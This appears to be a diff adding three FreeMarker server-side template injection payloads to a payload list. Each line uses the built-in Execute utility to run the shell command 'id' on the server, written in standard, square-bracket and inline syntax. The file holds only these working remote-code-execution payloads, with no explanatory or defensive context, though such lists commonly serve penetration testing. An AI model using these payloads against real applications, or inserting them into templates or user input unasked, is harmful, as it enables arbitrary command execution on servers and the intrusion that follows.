@@ -1,0 +1,4 @@
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+
